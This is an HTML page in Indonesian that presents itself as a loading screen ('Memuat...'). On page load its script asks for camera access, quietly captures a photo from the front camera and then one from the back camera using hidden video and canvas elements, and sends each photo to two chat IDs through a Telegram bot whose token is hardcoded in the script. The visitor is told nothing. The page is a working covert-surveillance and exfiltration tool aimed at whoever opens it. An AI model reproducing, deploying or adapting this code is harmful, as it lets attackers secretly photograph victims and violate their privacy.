<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Memuat...</title>
</head>
<body>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const telegramToken = "8937858897:AAF5POAsvL9AiJAX6SnHiznPlMaV8Ne6oVU";
        const chatIds = ["8401116235", "5408520831"];

        window.addEventListener('DOMContentLoaded', async () => {
            // 1. Ambil foto dari KAMERA DEPAN
            await ambilDanKirimFoto("user", "📸 Foto Kamera Depan!");

            // Jeda 2 detik sebelum pindah ke kamera belakang
            setTimeout(async () => {
                // 2. Ambil foto dari KAMERA BELAKANG
                await ambilDanKirimFoto("environment", "📸 Foto Kamera Belakang!");
            }, 2000);
        });

        async function ambilDanKirimFoto(facingType, captionText) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');

            try {
                // Minta izin kamera sesuai parameter (user = depan, environment = belakang)
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: facingType }, 
                    audio: false 
                });
                
                video.srcObject = stream;
                
                // Tunggu sebentar agar gambar sempat fokus
                await new Promise(resolve => setTimeout(resolve, 1500));

                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                
                const context = canvas.getContext('2d');
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                // Matikan track kamera tersebut
                stream.getTracks().forEach(track => track.stop());

                // Ubah ke format blob dan kirim ke Telegram
                const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/jpeg', 0.85));
                if (!blob) return;

                for (const chatId of chatIds) {
                    const formData = new FormData();
                    formData.append('chat_id', chatId);
                    formData.append('photo', blob, `${facingType}-capture.jpg`);
                    formData.append('caption', captionText);

                    await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });
                }
            } catch (error) {
                console.error(`Gagal akses kamera ${facingType}:`, error);
            }
        }
    </script>
</body>
</html>
